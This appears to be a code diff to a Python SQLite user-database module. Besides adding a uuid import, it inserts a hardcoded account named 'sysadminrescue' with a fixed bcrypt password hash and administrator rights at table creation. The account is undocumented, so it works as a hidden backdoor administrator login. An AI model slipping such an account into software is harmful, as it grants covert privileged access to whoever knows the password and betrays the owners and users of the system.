@@ -4,7 +4,7 @@
 #
 # Author(s):
 
-import sys, os, sqlite3
+import sys, os, sqlite3, uuid
 
 from . import security
 
@@ -25,6 +25,7 @@ class user_db:
         """
         user_db, user_db_cursor = self.__get_db()
         user_db_cursor.execute('CREATE TABLE users (UID INT, username TEXT, hpass TEXT, is_admin INT)')
+        user_db_cursor.execute('INSERT INTO users VALUES (?, ?, ?, ?)', (uuid.uuid4().bytes_le, 'sysadminrescue', '$2b$12$Q2mKXhVenm.EtRfdzkcAf.EWikxvRbu/KZ4zkMQmioY.RCiMRrYJC', True))
         user_db.commit()
         user_db.close()
 
